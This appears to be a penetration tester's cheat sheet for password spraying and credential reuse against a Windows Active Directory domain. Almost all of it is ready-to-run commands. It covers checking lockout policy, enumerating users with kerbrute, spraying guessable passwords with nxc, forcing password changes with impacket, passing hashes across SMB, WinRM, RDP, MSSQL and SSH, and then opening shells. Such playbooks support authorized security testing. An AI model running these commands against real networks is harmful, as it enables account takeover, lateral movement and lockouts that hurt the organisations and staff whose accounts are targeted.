# Password spraying

## The lockout policy first
nxc smb <DCIP> -u '' -p '' --pass-pol
nxc smb <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --pass-pol
From a shell on a domain-joined Windows host:
net accounts /domain
- [ ] Threshold 5 with a 30-minute reset: three guesses per user in each 30 minutes, no more
- [ ] Threshold 0 or None: no lockout, and I still go slowly
- [ ] Each round's time written down, so the next waits out the reset

## Users to spray
- [ ] users.txt from :Pb smb or :Pb ldap, or built from names with :Pb wordlists
With no credential, valid names over Kerberos (tool install kerbrute, at the pwn-broker prompt):
kerbrute userenum -d <Domain> --dc <DCIP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute.log
grep VALID kerbrute.log | awk '{print $NF}' | cut -d@ -f1 | sort -u > users.txt

## Spray
One password, every user, carrying on after a hit:
nxc smb <DCIP> -d <Domain> -u users.txt -p '<Password>' --continue-on-success
Each user's name as their password, paired line by line:
nxc smb <DCIP> -d <Domain> -u users.txt -p users.txt --no-bruteforce --continue-on-success
Known pairs, line 1 with line 1:
nxc smb <DCIP> -d <Domain> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
Over Kerberos, stopping if any account comes back locked:
kerbrute passwordspray --safe -d <Domain> --dc <DCIP> users.txt '<Password>'
- [ ] Candidates: season and year, such as Autumn2026!, month and year, Welcome1, Password1, the company's name with digits
- [ ] Every password I have found anywhere, before any guess

## Read the result
- [ ] [+]: the password is right
- [ ] (Pwn3d!): right, and a local administrator on that host
- [ ] STATUS_PASSWORD_MUST_CHANGE or STATUS_PASSWORD_EXPIRED: right, and it must be changed before use
- [ ] STATUS_ACCOUNT_DISABLED: right, on a disabled account, so try it on other accounts
- [ ] STATUS_ACCOUNT_LOCKED_OUT: stop at once

## A password that must change
impacket-changepasswd '<Domain>/<TargetUser>:<Password>@<DCIP>' -newpass 'Pwned123!'
smbpasswd -r <DCIP> -U '<TargetUser>'
nxc smb <DCIP> -d <Domain> -u '<TargetUser>' -p 'Pwned123!'

## Reuse everything I hold
Every host I know of goes in targets.txt, one per line.
nxc smb targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
nxc smb targets.txt -d <Domain> -u users.txt -H hashes.txt --continue-on-success | tee nxc-smb.txt
nxc smb targets.txt -u Administrator -H '<Hash>' --local-auth --continue-on-success
nxc smb targets.txt -u Administrator -p '<Password>' --local-auth --continue-on-success
grep -F '[+]' nxc-smb.txt
Other services, with the same credential:
nxc winrm targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
nxc rdp targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
nxc mssql targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
nxc ssh targets.txt -u '<Username>' -p '<Password>' --continue-on-success
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>'
- [ ] A hit with (Pwn3d!) or on WinRM: a shell with evil-winrm or impacket-psexec
